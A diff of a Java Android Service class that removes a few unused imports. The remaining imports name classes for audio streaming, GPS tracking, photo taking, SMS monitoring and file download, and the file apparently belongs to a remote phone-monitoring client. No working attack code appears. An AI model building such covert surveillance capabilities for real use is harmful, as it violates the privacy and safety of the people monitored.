@@ -1,7 +1,6 @@
 package my.app.client;
 
 import java.util.ArrayList;
-import java.util.HashSet;
 
 import my.app.Library.AdvancedSystemInfo;
 import my.app.Library.AudioStreamer;
@@ -11,14 +10,12 @@ import my.app.Library.DirLister;
 import my.app.Library.FileDownloader;
 import my.app.Library.GPSListener;
 import my.app.Library.PhotoTaker;
-import my.app.Library.SMSLister;
 import my.app.Library.SMSMonitor;
 import my.app.Library.SystemInfo;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.location.Location;
 import android.location.LocationListener;
 import android.media.AudioRecord;
@@ -31,7 +28,6 @@ import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
-import inout.Protocol;
 
 public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener, LocationListener {
 	
